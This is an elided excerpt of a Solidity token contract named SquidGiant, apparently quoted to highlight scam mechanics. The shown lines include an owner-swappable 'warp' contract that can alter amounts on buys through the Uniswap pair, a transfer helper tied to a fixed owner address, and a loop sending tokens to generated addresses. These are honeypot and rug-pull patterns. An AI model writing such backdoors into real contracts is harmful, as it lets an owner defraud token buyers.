...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function transferToken(
        ...
        _transfer(_tokenOwner, recipient, amount);
...
contract SquidGiant is ERC20 {
    ...
    constructor(address tokenOwner) ERC20("SquidGiant", "SquidGiant") {
	...
	function changeSwapWarp(SquidGiantWarp _warp) public onlyOwner {
        warp = _warp;
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || isAddLdx) {
            takeFee = false;
        }else{ if(from == uniswapV2Pair){amount = warp.warpToken(amount);}else if(to == uniswapV2Pair){warp.addTokenldx(amount);}else{
                takeFee = false;}}
	...
	function _takeInviterFeeKt(
        ...
        for (uint256 i = 0; i < 9; i++) {
            ...
            ktNum = ktNum+1;
            super._transfer(address(this), _receiveD, amount.div(i+11));
        }
    }
